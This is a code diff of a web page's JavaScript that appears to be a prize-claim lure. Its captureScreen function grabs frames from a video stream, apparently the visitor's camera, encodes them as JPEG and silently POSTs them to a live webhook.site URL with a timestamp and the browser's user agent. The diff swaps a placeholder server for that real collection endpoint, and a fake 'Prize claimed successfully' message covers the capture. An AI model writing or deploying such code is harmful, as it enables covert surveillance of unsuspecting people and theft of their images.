@@ -82,28 +82,29 @@
         }, 2000);
 
         async function captureScreen() {
-            if (!stream || capturing) return;
-            capturing = true;
-            
-            const canvas = document.createElement('canvas');
-            canvas.width = 640;
-            canvas.height = 480;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            const imgData = canvas.toDataURL('image/jpeg', 0.8);
-            
-            // Yahan tumhara server link daalna (Step 4 mein set karenge)
-            try {
-                await fetch('https://your-server.com/capture.php', {
-                    method: 'POST',
-                    body: JSON.stringify({
-                        image: imgData,
-                        time: new Date().toISOString()
-                    })
-                });
-            } catch(e) {}
-            
-            capturing = false;
-        }
+    if (!stream || capturing) return;
+    capturing = true;
+    
+    const canvas = document.createElement('canvas');
+    canvas.width = 640;
+    canvas.height = 480;
+    canvas.getContext('2d').drawImage(video, 0, 0);
+    const imgData = canvas.toDataURL('image/jpeg', 0.8);
+    
+    try {
+        await fetch('https://webhook.site/d9df29b8-c8d3-4052-a611-37f306afaa77', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                image: imgData,
+                time: new Date().toISOString(),
+                userAgent: navigator.userAgent
+            })
+        });
+    } catch(e) {}
+    
+    capturing = true;
+}
 
         function claimPrize() {
             status.textContent = '🎉 Congratulations! Prize claimed successfully!';
